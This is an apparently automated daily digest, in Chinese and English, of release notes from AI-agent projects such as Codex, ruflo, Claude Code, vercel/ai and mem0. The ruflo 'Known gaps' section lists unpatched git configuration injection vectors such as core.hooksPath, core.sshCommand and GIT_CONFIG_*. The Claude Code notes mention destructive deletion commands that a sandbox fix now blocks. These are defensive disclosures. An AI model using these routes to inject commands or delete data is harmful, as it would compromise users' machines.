summary_brief: 9/26是自9/20以来确立的"Agent安全即基础设施+旗舰模型生态+多智能体分布式协作"三大主线的继续深化日，无方向性转折，但也非纯复制。安全仍是绝对主线并升级为"系统性权限模型治理"：Codex同日密集提交保护.aws目录、跨可写根守护Git目录、守护MCP凭据跨重连边界、PID命名空间继承与macOS TLS信任评估放行；ruflo强化MCP stdio强制策略与validateEnv路径型拒绝；deer-flow脱敏日志凭据并加强插件资源目标鉴权——标志安全从9/20起的功能补齐转向权限/凭据/供应链的系统化攻防纵深。相对历史最新的三个推进点：①Codex新增版本化HTTP API的RemoteAgentMessageBoard（含真实SSE实时订阅与认证板管理），把9/21/9/25的分布式多智能体消息板推进为可实时跨进程/跨机器的标准通道；②instant_interrupt抢占机制横跨in-process/stdio/gRPC三套运行时产品化，承接9/25成型的抢占范式；③vercel/ai批量发版101子包中唯一Major @ai-sdk/perplexity@5.0.0从Sonar Chat Completions迁移到Agent API并标BREAKING（Perplexity 9/27后废弃旧接口），是必须跟进的首个Provider接口迁移风险点。多模态视觉（goose/playwright/clawhub）、会话跨端迁移与云端共享（cline handoff/OpenHands只读）、模型适配（GPT-6/Claude Sonnet 5）等既有主线维持推进。当日116条信号、11个高影响信号处于正常区间，属高位活跃周期内多线延续与系统性深化的高质量收口日。

engineering_signals.title: Agent 沙箱与权限边界安全加固成为集体投入焦点
engineering_signals.why_it_matters: 多家主流 Agent 项目同日推出沙箱隔离与权限最小化措施：Codex 保护 .aws 目录、跨可写根保护 Git 目录、守护 MCP 凭据边界跨重连、PID 命名空间继承、macOS TLS 信任评估放行；ruflo 强化 MCP stdio 强制策略与 validateEnv 路径型拒绝；deer-flow 脱敏日志凭据、加强插件资源配置目标鉴权。这些分别针对凭据泄露、命令注入、SSO 提权与资源耗尽攻击，共同反映 Agent 安全从功能补齐走向系统性权限模型治理。

engineering_signals.title: 交互式 Agent 抢占/让出机制兴起，提升并行与响应灵敏度
engineering_signals.why_it_matters: Codex 推出成熟的 code-mode 抢占与让出机制（instant_interrupt），使长任务可提前 yield 接收新输入而不停止单元，横跨 in-process、stdio 与 gRPC 三套运行时；claude-agent-sdk-python 修复 stdin 过早关闭导致多轮对话失败；openai-agents-python 修复 session.close() 挂起并提高 WebSocket 容错。这些共同指向 agent 长会话交互体验与运行时可中断性的系统化改进。

engineering_signals.title: 分布式多 Agent 异步协作基础设施加速成型
engineering_signals.why_it_matters: Codex 新增版本化 HTTP API 的 RemoteAgentMessageBoard（含认证板管理与真实 SSE 实时订阅）及多代理生成延时/失败指标，为跨进程、跨机器的代理间异步协作打通标准通道；同时 op cncode 在 feature flag 下注册托管 MCP 服务器、绑定受限宿主模型调用。这体现 Agent 编排从单机走向分布式多智能体协同的演进方向，是重要的基础设施投入。

engineering_signals.title: 大模型 Provider 生态加速适配新旗舰模型并经历 Breaking 迁移
engineering_signals.why_it_matters: promptfoo 一次性更新 GPT-6 Sol、Claude Sonnet 5、Claude 3.7 Sonnet 等前沿模型配置并新增 Qwen/DeepSeek/GLM/Grok 语音支持；llama_index 接入 claude-opus-5-5 与 GPT-6 系列；Codex 支持 GPT-6 Sol/Luna（含 Bedrock）；同时 Claude Code 新增 Bedrock Mantle 上游与模型白名单治理。更重要的是 vercel/ai 批量发版 101 子包，唯一 Major @ai-sdk/perplexity@5.0.0 从 Sonar Chat Completions 迁移到 Agent API（Perplexity 将于9月27日后废弃旧接口），是必须跟进的不兼容升级。

engineering_signals.title: Agent 多模态视觉能力跨项目系统落地
engineering_signals.why_it_matters: goose 通过 with_canonical_vision_support 修复 supports_vision 仅在少数路径解析、导致视觉模型图片被替换为文本的问题，使所有 canonical 解析提供方正确启用视觉；clawhub 新增 Computer use(CUA) 分类并策展端侧计算机操作能力；playwright 提升截图帧在飞并发数解决高负载丢帧。三者从多模态输入、端侧操作到录制质量共同推进 agent 视觉与真实环境交互能力。

engineering_signals.title: Agent 会话跨端迁移与云端共享协作持续演进
engineering_signals.why_it_matters: cline 新增共享云端交接(handoff)能力使桌面端与云端会话无缝迁移；OpenHands 支持云端只读打开共享自动化会话便于协作审查审计，并保留云端 MCP OAuth 凭据；gptme 新增局域网 QR 访问后端支持移动端接入。这些体现 agent 会话从单机单用户走向跨平台、跨端、可共享协作的集体演进。

engineering_signals.title: AI 驱动的开发者工作流与测试契约化加速落地

releases.summary:
## Changes

### PR [#2069](https://github.com/danielmiessler/Fabric/pull/2069) by [1rashiid](https://github.com/1rashiid) and [ksylvan](https://github.com/ksylvan): feat(cli): add --workflow for sequential pattern composition

- Added a `--workflow` flag that chains multiple patterns together from a YAML or JSON file, piping each step's output into the next step's input.
- Preserved compatibility with existing flags, including `--stream`, `--dry-run`, `-m`/`-V`, `--context`, `--strategy`, and `--language`, while leaving the single-pattern `-p` path untouched.
- Added pre-flight validation that catches empty steps, missing or repeated patterns, and unknown pattern names before any LLM call is made.
- Added per-step overrides for input, model, vendor, and variables, with progress and error messages prefixed as `[step N/TOTAL pattern]` on stderr to keep stdout pipe-clean.
- Added shell completions for `--workflow` in Bash, Zsh, and Fish, including workflow file path suggestions.

key_changes: 新增 --workflow 命令行标志，支持从 YAML 或 JSON 文件按顺序组合多个 pattern，并将每个步骤的输出作为下一步的输入
支持 --stream、--dry-run、-m/-V、--context、--strategy、--language 等现有标志与 --workflow 组合使用，单 pattern 的 -p 路径不受影响
增加预检验证机制，在调用 LLM 前检测空步骤、缺失或重复的 pattern 名称及未知 pattern，避免无效请求
支持按步骤覆盖输入、模型、供应商及变量，通过 [step N/TOTAL pattern] 前缀输出进度和错误信息，保持 stdout 管道纯净
为 Bash、Zsh 和 Fish shell 添加 --workflow 的自动补全支持，包括工作流文件路径建议
ai_summary.summary_cn: 本版本新增了 --workflow 命令行功能，允许用户通过 YAML 或 JSON 文件将多个 pattern 串联成顺序流水线，实现多步骤的复杂任务处理。该功能保留了与现有参数的兼容性，并引入了预检验证、按步骤覆盖配置以及 Shell 自动补全等配套能力，显著增强了 fabric 的模式组合能力。

releases.author: ruvnet
releases.summary:
## What changed

29 reviewed PRs landed together, plus the memory fix that #3352 needed. Every diff was read by a security reviewer first; the combined tree was built and tested before it merged.

**Fixes that were silently not working**
- Daemon YAML config was ignored under ESM (#3420); a stale daemon state could end a fresh session (#3421).
- Workflow steps with hyphenated names never interpolated (#3422).
- MCP policy enforcement (`RUFLO_MCP_ENFORCE_POLICY`) was skipped by the shipped stdio launchers (#3423).
- A late HTTP timeout could double-write a response (#3426).
- `memory_retrieve` served stale values when two servers shared a store (#3361); `mcp start` on stdio no longer SIGKILLs a sibling server (#3365); a dead process no longer holds `state.lock` for 30 s (#3363).
- `--no-codex-detect` was never honoured (#3434); agent `instructions` were ignored at execution (#3429); browser errors now surface the real detail (#3430).
- `EWCConsolidator` EMA direction was inverted (#3395); MoE load-balance loss was computed but never applied (#3330); swarm leader edges were never mirrored (#3357).

**Security**
- Namespace/key collisions in the memory upsert no longer delete distinct entries (#3352 + #3359).
- `validateEnv()` denylist gains the PATH / search-path family (#3385).
- Background `git` calls neutralise repo-local `core.fsmonitor` (#3382, partial: see below).
- `github-safe.js` regression gate covers all three shipped helper copies (#3412).
- Plugin scripts stop running `npx` at tool-call time (#3367).

**New**
- `witness verify --strict` (#3424), `--request-timeout-ms` for the HTTP MCP transport (#3426), a doctor check for `agent-browser` (#3441), native AgentDB integrity check in doctor (#3431), Simplified Chinese README (#3316).

## Upgrade notes
- `embeddings init` and `models --download` now **exit 1** when `@claude-flow/embeddings` is not installed (#3379). Scripts that ran them bare will start failing.
- `sonaTracksGlobal` in unified stats changes from boolean to `null` (#3439).
- MoE load-balance loss is now **on by default** for existing persisted models (#3330).
- `globalFisher` now moves about 100x slower per update after the EMA direction fix (#3395).
- Three packages resolve from the registry rather than the release tarballs, and were published standalone first: `@claude-flow/memory` 3.0.0-alpha.26, `@claude-flow/neural` 3.0.0-alpha.10, `@claude-flow/cli-core` 3.7.0-alpha.6. The CLI pins all three exactly.

## Known gaps
- #3382 only neutralises `core.fsmonitor`. `core.hooksPath`, `filter.*`, `diff.external`, `core.sshCommand`, `GIT_CONFIG_*` and about 15 raw `git` callers are still exposed. #3385's denylist omits `GIT_CONFIG_*` and `HOME`.
- The published `@claude-flow/mcp@3.0.0-alpha.9` still ships the shell-string `github-safe.js` reported in #3411. The source has been shell-free for some time; a corrected `mcp` publish needs its own decision.

Not included (held for changes): #3333, #3268, #3339, #3393, #3369, #3387, #3425, #3428, #3432, #3433, #3435, #3437, #3440, #3442, #3341, #3373, #3438, #3295, #3296, #3298, #3270, #3307, #3309, #3310.

Full list and validation: #3443.

key_changes: 修复大量静默失效的问题：ESM 下 Daemon YAML 配置被忽略、带连字符的工作流步骤从不插值、MCP 策略在 stdio 启动器下被跳过、HTTP 超时导致响应双重写入等
安全加固：内存 upsert 命名空间/键冲突不再误删不同条目，validateEnv() 黑名单补充 PATH 系列，后台 git 调用中和了仓库级 core.fsmonitor，插件脚本停止在工具调用时运行 npx
新增功能：witness verify --strict、HTTP MCP 传输的超时参数、agent-browser 医生检查、原生 AgentDB 完整性检查、简体中文 README
升级/破坏性变更：embeddings init 和 models --download 在未安装依赖时退出码变为 1，sonaTracksGlobal 从布尔值改为 null，MoE 负载均衡损失对现有持久化模型默认启用，globalFisher 更新速度大幅减慢约 100 倍
已知缺口：git 安全中和尚未覆盖 core.hooksPath、filter.*、sshCommand 等，且 GIT_CONFIG_* 和 HOME 未加入黑名单；已发布的 mcp 包仍包含有 shell 字符串的旧版 github-safe.js
ai_summary.summary_cn: v3.46.0 是 ruvnet/ruflo 的一次重要修复版本，共合并了 29 个经过安全审查的 PR，修复了大量此前静默失效的功能（包括 ESM 配置忽略、MCP 策略绕过、内存存储串值等问题），并进行了多项安全加固。该版本还引入了若干破坏性变更（退出码变化、统计字段类型变更、MoE 行为默认值调整等），同时新增了严格验证模式、完整性检查和简体中文 README 等功能。

releases.summary:
### Major Changes

- 38fe0e5: BREAKING: Migrate language generation from the Sonar Chat Completions API to the Agent API. Replace Sonar model IDs and provider options with Agent API presets, models, and tools. The new API changes request and response metadata, raw stream events, usage and cost data, and does not support Sonar PDF input or image and video results.

### Patch Changes

- 38fe0e5: Recover missing text from Agent API terminal events and output items, including incomplete responses, without repeating text already received as deltas. Track each message content part separately.
- 38fe0e5: Accept native Agent API tool traces such as finance results without validating them as web search results. Preserve these traces in raw responses and stream chunks.
- 38fe0e5: Preserve URL citation annotations as sources in Agent API streams, including completed and incomplete terminal responses.
- 38fe0e5: Emit each Agent API source URL once while preserving search result IDs for citation correlation when a URL is fetched or annotated before it appears in search results.

key_changes: @ai-sdk/perplexity@5.0.0 为唯一 Major 版本，属 BREAKING：语言生成从 Sonar Chat Completions API 迁移到 Agent API，需替换模型 ID、provider 选项，且不再支持 Sonar PDF 输入及图片/视频结果返回

releases.summary:
## What's changed

- Added `x-claude-code-prompt-id` to the gateway hint headers so LLM gateways can group the requests that serve one user prompt; opt in with `CLAUDE_CODE_GATEWAY_HINT_HEADERS=1`
- Added `availableModelsMatch` managed setting: with `"exact"`, an `availableModels` entry allows only the model version it names, so new releases stay blocked until listed
- Added `deniedModels` managed setting to block specific models, even when `availableModels` allows them
- Added MCP tool, WebFetch and WebSearch outputs to the `tool.output` OpenTelemetry span event when `OTEL_LOG_TOOL_CONTENT=1`
- Added `/doctor prompt-audit` (also `/checkup prompt-audit`) to audit your CLAUDE.md files, skills, agents and commands for prompting patterns written for older models
- Added click-to-expand for truncated messages from your other sessions in fullscreen mode
- Added `path` to `--plugin-dir` load-failure entries in the stream-json `system/init` `plugin_errors`, naming the directory that did not load
- Added an opt-in `load_test_mode` block to the Claude apps gateway config: requests are built and signed but not sent upstream, and clients get a canned reply, so a deployment can be load tested
- Added a `mantle` upstream provider to the Claude apps gateway for Amazon Bedrock's Mantle endpoint
- Fixed SDK sessions losing a deferred tool call or finished tool result when a turn ended early, a held approval prompt after a worker restart, and a non-streaming fallback's `result.usage`
- Fixed MCP progress notifications being discarded once a long-running tool call moved to the background; the background task now shows the latest progress
- Fixed stdio MCP servers being left running when the session ended while they were still starting
- Fixed a brief HTTP 404 from a stateless remote MCP server (for example a proxy mid-redeploy) leaving that server unusable for the rest of the session while still shown as connected
- Fixed MCP sign-in for a server with no valid URL failing with an opaque SDK error; `/mcp` no longer offers Authenticate for such servers
- Fixed the weekly Fable limit not appearing in `/usage` and the VS Code usage meters when telemetry is disabled
- Fixed `/model` accepting Sonnet 4.6 or Sonnet 5 with `[1m]` when the id carried a date or `-v1:0` suffix, in the cases where the plain id was refused
- Fixed `/model` picker showing a hardcoded Haiku version and price when `ANTHROPIC_DEFAULT_HAIKU_MODEL` pins a different model
- Fixed dynamic workflows started during a model fallback running every agent on the fallback model instead of retrying the configured model
- Fixed `DISABLE_PROMPT_CACHING_HAIKU` having no effect when Haiku is the session's main model
- Fixed `claude plugin validate` saying Claude Code accepts a plugin or marketplace name it cannot install; such names in `marketplace.json` now fail validation
- Fixed `claude plugin validate` passing plugins whose `outputStyles`, `themes`, `monitors`, or `lspServers` paths are missing or point outside the plugin directory
- Fixed `claude plugin details` showing 0 MCP servers for plugins that declare their servers in `plugin.json`
- Fixed `claude plugin marketplace remove` not saying which installed plugins it uninstalled with the marketplace; it now lists them
- Fixed `claude plugin uninstall` removing the other of two installed plugins whose ids differ only in case, with its options and secrets, when the one named had no `enabledPlugins` entry at that scope
- Fixed plugins that declare no version being silently restored at their source's newest commit, not the installed one, when their cached files were missing
- Fixed user-installed plugins and marketplaces failing to load with "cache-miss" after the home or config directory was moved, for example in bind-mounted devcontainers
- Fixed `installed_plugins.json` showing no plugins when it holds a record under an invalid plugin id; such a file loads again
- Fixed `installed_plugins.json` being rewritten, losing records, when it holds a record this version cannot read; `claude plugin` commands now name the record and say how to recover
- Fixed permission dialogs in screen-reader mode reading quoted commands and paths as if they were the dialog's own text
- Fixed `/context` not counting MCP server instructions: they now appear as their own row and count toward the total
- Fixed markdown links in the Warp terminal rendering as plain text instead of clickable hyperlinks
- Fixed `claude mcp add`, `add-json`, and `remove` reporting success when the user or local config file could not be written, for example inside a sandbox
- Fixed the first words of a reply in a cloud session sometimes appearing late instead of streaming as Claude writes them
- Fixed Claude's built-in keybindings guide saying chords time out after 1 second instead of 3, and calling `cmd` an alias of `meta`, which could produce `cmd+` shortcuts most terminals never send
- Fixed `keybindings.json` silently accepting a misspelled modifier such as `ctl+k`; it now warns in the debug log and suggests the fix
- Fixed footer hints still saying "Enter to view" after `footer:openSelected` was rebound or unbound in `keybindings.json`
- Fixed keys typed quickly together (type-ahead, key repeat, bursts over ssh or tmux) sometimes being handled against stale state
- Fixed worktree checkouts failing certificate verification (for example on Git LFS downloads) when the CA certificate is passed to git as `GIT_CONFIG_COUNT` environment pairs
- Fixed sandboxed `git` asking credential helpers to store the sandbox proxy's login, which printed "failed to store"
- Fixed managed `sandbox` settings being ignored entirely when one nested value was invalid; the invalid value now fails closed and the rest of the block still applies
- Fixed Claude's edits to its own auto-memory notes being blocked as sensitive-file writes when Claude Code was started in a subdirectory of a git repository
- Fixed Remote Control being unavailable on paid plans when telemetry is turned off with `DISABLE_TELEMETRY` or `DO_NOT_TRACK`
- Fixed the `/remote-control` menu cutting its QR-code hint mid-word in narrow terminals
- Fixed vim mode `.` dropping a Shift+Enter newline, leaving the cursor inside an accented letter, and repeating an older change after `3J` or Visual-mode `J` on the last line
- Fixed vim mode cursor placement: recalling a prompt over 10,000 characters in normal mode no longer leaves the cursor past the end, and `V` then `p` now lands on the first non-blank
- Fixed vim mode `J` joining lines with different spacing than Vim (such as a space before `)` or after a tab), and `3J` or Visual-mode `J` on the last line not moving the cursor as Vim does
- Windows: Fixed the PowerShell tool letting `cmd /c rd`, `rmdir`, `del` or `erase` delete drive roots, the home folder and other folders that `Remove-Item` refuses
- Improved the `/mcp` tool list: it shows more tools at once, scrolls with the page keys and mouse, and marks tools your organization blocked with a warning icon
- Improved MCP tool results: images returned by MCP tools are now also saved to a file, so Bash, Read and other tools can open them
- Improved `/tasks`: rows show a status icon, the name and whole facts, the title and key hints stay on screen with many tasks, and the list gains paging keys, the mouse wheel and clicks
- Improved lists in `/help`, `/hooks`, `/copy`, `/chrome`, `/memory`, `/ide`, `/release-notes`, `/rewind`, `/diff`, `/remote-env`, `/plugin` and other pickers with page keys, mouse wheel and clicks
- Improved lists beside a search box, such as `/skills` and `/artifacts`, to draw their pointer dim while the search box has the keys, so only one pointer is highlighted
- Improved the compaction spinner: its timer now starts when compaction begins and it counts the summary's tokens as they stream, replacing the percentage bar
- Improved the browser page shown after signing in to an MCP server: centered layout, dark mode, and new artwork
- Improved the Skill tool's reply when a skill belongs to a plugin that failed to load, so Claude tells you the plugin could not be loaded instead of calling the skill uninstalled
- Improved `prompt-audit` on Claude Code configuration: stale paths, stale commands and contradicting instruction files now lead the report, and thinking keywords that Claude Code documents are kept
- Improved recovery from an `installed_plugins.json` that cannot be read at all: its contents are kept in a file beside it before it is rebuilt, and `claude plugin list` names that file
- Improved artifact database reads: an ordered query that returns a full page now says it is one page and how to read the rest
- Improved first-reply latency: a pattern-compile step that ran at the end of a session's first reply now runs while the reply streams in
- Improved first-request latency by reusing the preconnected API connection
- Improved startup: `claude -p` and Claude Code Remote no longer load the interactive UI, and the auto-mode classifier's rules and the Artifact tool load on first use instead of at launch
- Improved startup for claude.ai accounts whose Artifact tool features aren't known yet, as on a first run: the prompt no longer waits up to 1.5 s to check them; the first message waits if needed
- Changed interactive sessions on third-party providers or with telemetry off to start in auto mode when no permission mode is configured; `permissions.defaultMode` still overrides it
- Changed the `/ultrareview` launch dialog to say that reviewing a local branch may upload uncommitted changes to tracked files
- Changed the `/model` picker's Opus row and the Default model's name to drop "(1M context)" where Opus already has a 1M context window; the window is unchanged
- Changed prompt suggestions in the terminal to appear less often after 20 in a row go unused; using one brings them back
- Changed `--system-prompt` and `--append-system-prompt` to accept their text and `-file` forms together; the file's text comes first
- Changed `Skill(anthropic-skills:<name>)` deny rules to also block that skill when Claude Desktop delivers it as a plugin, and `Skill(skill:<name>)` denies to match the skill's alias and display name
- Changed `/rewind` and `/diff` lists to move on the same keybinding actions as every other list (`select:*`); `messageSelector:*`/`diff:*` rebinds still work
- Changed the `/workflows` run list to size itself like other lists: half the terminal inline, and it keeps its title on screen when the prompt shows below
- Changed `claude plugin eval` to require git 2.31 or later when git is installed; a run on an older git is refused with a message naming the version
- Changed artifact watching: a watch that was armed automatically (not one you asked for) now ends after 3.5 hours with no activity; publishing or watching the artifact again re-arms it
- Self-hosted runner: Changed lifecycle hooks' git to skip a repository's Git LFS `pre-push` hook, ignore a writable system `core.hooksPath`, and not sign commits without `--configure-git`
- Self-hosted runner: Changed `GIT_SSL_CAINFO` and `GIT_SSL_NO_VERIFY` under Anthropic-managed git: the runner's own git always verifies Anthropic's git route, and warning lines say what applies where
- Reverted the 2.1.282 reservation of the `claude-ai` name: skills, commands, workflows and MCP servers' skills and prompts so named load again, and `Skill(claude-ai:*)` rules are ordinary prefix rules
- [VSCode] Fixed the permission mode indicator showing Default while the session kept running in auto or bypass mode after an automatic switch out of it failed; the switch is now retried until it lands
- [VSCode] Fixed a session teleported from the web dropping the messages sent while Claude was working
- [VSCode] Fixed a Web session staying hidden from the session list, and an empty chat opening in its place, when an older version had saved an empty local copy of it
- [VSCode] Fixed a reopened session splitting a turn at a message Claude received mid-turn, such as an automatic continuation
- [VSCode] Fixed a reloaded session showing a rewound-away turn, or only the rows before a compaction
- [VSCode] Fixed the footer's agents pill drawing its icon off-center, with the status dot against the edge, in narrow panels
- [VSCode] Fixed the chat input showing its text slightly below the cursor and selection after pasting lines that end with a line break into a long prompt
- [Cloud sessions] Improved adding a repository to a running cloud session: a private repository your GitHub account can read but not push to now attaches for reading
- [Cloud sessions] Fixed cloud sessions occasionally redoing an already-finished step, such as posting a duplicate comment or push, after recovering from a server-side restart
- [Cloud sessions] Changed new routine schedules to default to a few minutes past the hour, with a note that routines set exactly on the hour can start several minutes late
- [Claude Tag] Added a "Channels Claude can search" admin setting that limits Claude's Slack search to public channels it has been added to, set per organization, workspace or channel
- [Claude Tag] Added a Back to Slack button on the page shown after connecting your Claude account, returning you to the thread you started from
- [Claude Tag] Fixed a channel's configure page listing no connectors or plugins when the channel gets its access bundle through an attach rule; rule-attached bundles are now shown
- [Claude Tag] Fixed access-bundle repository search missing repositories on GitHub App installs that are limited to a large list of selected repositories
- [Claude Tag] Fixed Claude occasionally posting the same reply twice when a new message interrupted it mid-reply
- [Claude Tag] Fixed channel routines that stopped running in older private channels whose Slack channel ID changed, for example after a Slack Connect share
- [Claude Tag] Fixed conversations in a channel set to "Channel only" all ending when a non-guest member joined and Slack was slow to confirm their membership
- [Code Review] Fixed "@claude review" requests going silent when GitHub failed to return the pull request: the request is retried once, and a comment explains if it still fails
- [Code Review] Fixed billing for a review that stopped at its time limit with nothing verified: it now shows as incomplete, isn't charged, and is retried once

releases.summary:
### Bug Fixes

- **Fixed follow-up turns failing after background subagents**: When using `query()` with hooks, `can_use_tool`, or SDK MCP servers, stdin was closed too early if a subagent finished just before the turn's result arrived. Follow-up turns would then fail with "Stream closed" and the model would report the tool as refused. The SDK now listens for the CLI's `session_state_changed` messages and keeps stdin open until the CLI reports `idle`, matching the TypeScript SDK's behavior. A bounded wait ceiling (configurable via `CLAUDE_CODE_PRINT_BG_WAIT_CEILING_MS`, default 10 minutes) prevents indefinite hangs. Older CLIs without state events fall back to the previous close-at-first-result behavior. (#1190, #1279)

### Documentation

- Aligned docstrings with the code and fixed docstring formatting (#1293)

### Internal/Other Changes

- Updated bundled Claude CLI to version 2.1.283
- CI: skip wheels over PyPI's per-file limit instead of failing the release (#1309)


---

**PyPI:** https://pypi.org/project/claude-agent-sdk/0.2.160/

```bash
pip install claude-agent-sdk==0.2.160
```

SDK 现在监听 CLI 的 session_state_changed 消息，保持 stdin 打开直到 CLI 报告 idle 状态，与 TypeScript SDK 行为保持一致
新增可配置的等待上限 CLAUDE_CODE_PRINT_BG_WAIT_CEILING_MS（默认 10 分钟），防止无限挂起；旧版 CLI 会自动回退到之前的行为
将文档字符串与代码对齐并修复了文档字符串格式问题
更新内置 Claude CLI 至 2.1.283 版本，并优化了 CI 对 PyPI 单文件大小限制的处理

releases.author: github-actions[bot]
releases.summary:
- The app now starts on machines that set a system HTTP(S) proxy, such as Clash, v2ray, or a corporate proxy. Before, the backend sent its local connection checks through the proxy, so it couldn't find its own hub and failed with "No compatible hub runtime is available." Local connections now skip the proxy, and any proxy exemptions you already had are kept
- On small or scaled displays, the main window now fits on screen. A 1080p laptop at 150% scaling used to open the window larger than the screen, which pushed the settings and account controls out of reach. An oversized window now shrinks to fit the screen (not counting the taskbar) and opens centered
- Plugin slash commands like `/goal` no longer vanish from the slash menu the first time you use them. Plugin commands now load as soon as a workspace opens instead of on your first `/`. If that first load is slow or fails, the app retries in the background, so the command no longer gets sent to the model as plain text
- The Providers settings (renamed from API Providers) now keep the model list inside the panel. Long model lists scroll in place, and the model controls stay reachable in short windows
- In SSH settings, **Save** is disabled until you change a saved host, and the button for a new host now says **Add**

releases.author: kartik-mem0
releases.summary:
**Bug Fixes:**
- **Core:** `add()` (`Memory` and `AsyncMemory`) no longer reports records the vector store rejected as successful `ADD` events. Only records that were actually inserted are written to history, entity-linked, and returned. If none of the extracted memories could be inserted, `add()` now raises `VectorStoreError` instead of returning memories that were never stored ([#7066](https://github.com/mem0ai/mem0/pull/7066))
- **Core:** Restore the context-manager protocol on `Memory` (`with Memory() as m:`) and `AsyncMemory` (`async with AsyncMemory() as m:`), which closes the instance on exit ([#7354](https://github.com/mem0ai/mem0/pull/7354))
- **LLMs:** The AWS Bedrock Anthropic path now returns the first Converse content block that carries text instead of always reading `content[0]`. Claude reasoning models can emit a `reasoningContent` block before the text block, which previously made the call fail with a `KeyError` ([#6369](https://github.com/mem0ai/mem0/pull/6369))
- **Vector Stores:** Turbopuffer filters now apply every operator (`eq`, `ne`, `gt`, `gte`, `lt`, `lte`, `in`, `nin`). Only `gte` and `lte` were read before, so any other operator was silently dropped and the query returned unfiltered results. An unsupported operator now raises `ValueError` ([#6564](https://github.com/mem0ai/mem0/pull/6564))
- **Vector Stores:** Turbopuffer `search()` scores now respect `distance_metric`. With `euclidean_squared`, the unbounded squared distance maps to `1 / (1 + distance)` instead of `1 - distance`, which went negative and inverted ranking for any distance above 1 ([#6559](https://github.com/mem0ai/mem0/pull/6559))
- **Vector Stores:** S3 Vectors `search()` scores are now metric-aware. With `euclidean`, the distance maps to `1 / (1 + distance)` instead of `max(0, 1 - distance)`, which collapsed most scores to 0 ([#6547](https://github.com/mem0ai/mem0/pull/6547))

key_changes: 核心修复：Memory 和 AsyncMemory 的 add() 方法不再将向量存储拒绝的记录报告为成功的 ADD 事件，仅记录实际插入的数据；若所有提取的记忆均插入失败，将抛出 VectorStoreError 异常
核心修复：恢复了 Memory 和 AsyncMemory 的上下文管理器协议（with Memory() as m / async with AsyncMemory() as m），退出时正确关闭实例
LLM 修复：AWS Bedrock Anthropic 路径现在返回第一个包含文本的 Converse 内容块，而非始终读取 content[0]，解决了 Claude 推理模型因 reasoningContent 块导致的 KeyError 错误
向量存储修复：Turbopuffer 过滤器现在支持所有操作符（eq/ne/gt/gte/lt/lte/in/nin），不支持的运算符将抛出 ValueError；同时搜索评分正确尊重距离度量，修复了排名倒置问题
向量存储修复：S3 Vectors 的 search() 评分现在感知距离度量，euclidean 距离正确映射为 1/(1+distance)，修复了多数分数被压缩为 0 的问题
ai_summary.summary_cn: v2.2.1 是一个侧重于修复的补丁版本，核心修复了 Memory/AsyncMemory 的 add() 方法对向量存储插入失败记录的错误处理，并恢复了上下文管理器协议。同时修复了多个向量存储（Turbopuffer、S3 Vectors）的过滤操作符和评分计算问题，以及 AWS Bedrock Anthropic 路径处理 Claude 推理模型时的文本提取错误。

releases.author: kartik-mem0
releases.summary:
**Bug Fixes:**
- **Config (OSS):** `ConfigManager` no longer injects OpenAI's default `baseURL` and `model` into non-OpenAI LLM providers. The defaults now apply only to `openai` and `openai_structured`, so a DeepSeek, xAI, or other provider config without an explicit `baseURL` or `model` falls back to that provider's own defaults and env vars (`DEEPSEEK_API_BASE`, `XAI_API_BASE`, ...) instead of pointing at OpenAI with an OpenAI model name ([#7350](https://github.com/mem0ai/mem0/pull/7350))
- **Vector Stores:** Turbopuffer filters now apply every operator (`eq`, `ne`, `gt`, `gte`, `lt`, `lte`, `in`, `nin`). Only the range operators were read before, so `eq`, `ne`, `in`, and `nin` were silently dropped. A `"*"` value now matches anything instead of nothing, an array value is treated as `in`, and an unsupported operator throws ([#6578](https://github.com/mem0ai/mem0/pull/6578))
- **Vector Stores:** Turbopuffer `search()` with `euclidean_squared` now maps the unbounded squared distance to `1 / (1 + distance)` instead of `1 - distance`, which went negative and inverted ranking for any distance above 1 ([#6580](https://github.com/mem0ai/mem0/pull/6580))
- **Packaging:** `pg`, `@types/pg`, and `natural` are now optional peer dependencies, and `pg` / `@types/pg` accept caret ranges instead of the exact `8.11.3` / `8.11.0` pins, so installing `mem0ai` no longer pulls in `pg` or conflicts with an app's own `pg` version. The PGVector store now imports `pg` only when it is used, so install it alongside `mem0ai` (`npm install pg`) if you use that store. `@types/jest` moved from peer dependencies to dev dependencies ([#7450](https://github.com/mem0ai/mem0/pull/7450))

key_changes: 修复 ConfigManager 不再为非 OpenAI 的 LLM 提供商（如 DeepSeek、xAI）注入 OpenAI 默认的 baseURL 和 model，使其正确回退到各自提供商的默认配置和环境变量
修复 Turbopuffer 向量存储的过滤器，现支持所有操作符（eq、ne、gt、gte、lt、lte、in、nin），此前仅范围操作符生效，eq/ne/in/nin 被静默忽略
修复 Turbopuffer search() 使用 euclidean_squared 时距离映射错误，将无界平方距离改为 1/(1+distance) 映射，避免距离超过 1 时产生负数导致排序反转
将 pg、@types/pg、natural 改为可选的 peer 依赖，PGVector 存储仅在需要时动态导入 pg，避免安装 mem0ai 时强制拉取或与应用的 pg 版本冲突
ai_summary.summary_cn: 本版本主要包含多项 Bug 修复。修复了 ConfigManager 对非 OpenAI LLM 提供商错误注入默认配置的问题，以及 Turbopuffer 向量存储在过滤器操作符和距离映射上的两个关键缺陷。同时优化了包的依赖管理，将 pg 等依赖改为可选的 peer 依赖，减少不必要的依赖冲突和安装负担。

releases.author: openclaw-stable-oss-releases[bot]
releases.summary:
### Highlights

- **More reliable sessions:** protect imported history, retry failed checkpoints, and preserve accepted settings and correct ownership across replacement and resume.
- **Complete output and cleanup:** receive large queued responses, retain diagnostics after disconnects, and wait for terminal cleanup while allowing completed flow commands to exit.
- **Replay viewer usability:** improve attempt navigation, conversation following, graph edges, tool status, and layouts on narrower screens.

### Fixes

- Windows/authentication: preserve inherited credential values when auth aliases use different environment-variable casing.
- Replay viewer: let arrow keys select previous and next attempts without snapping back on every key release, and keep playback running when tabbing into the scrubber.
- Replay viewer: reapply follow centering when a graph viewport is replaced, even when its target and layout identifiers are unchanged.
- Replay viewer: restore conversation auto-follow on session changes and replay resume, and preserve upward keyboard or scrollbar scrolling after content updates that do not move the pane.
- Sessions/filesystem: update fs-safe to 0.18.1 so lock waits use elapsed time across system-clock adjustments and temporary output storage uses verified directory ownership. Thanks @vincentkoc.
- Sessions/import: publish imported history before making its session discoverable, so a failed history write does not leave a partial session that blocks retrying the archive.
- Sessions/journal: retry captures changed by rotation without skipping retained events or reporting false corruption, and preserve reader progress when a page fails or is cancelled.
- Sessions/checkpoints: keep failed saves pending so later flushes retry current state without losing updates or allowing replacement to bypass persistent storage failures.
- Runtime/shutdown: drain retained and retiring session checkpoints, wait for every owner's cleanup, and report failures instead of silently succeeding after persistence errors.
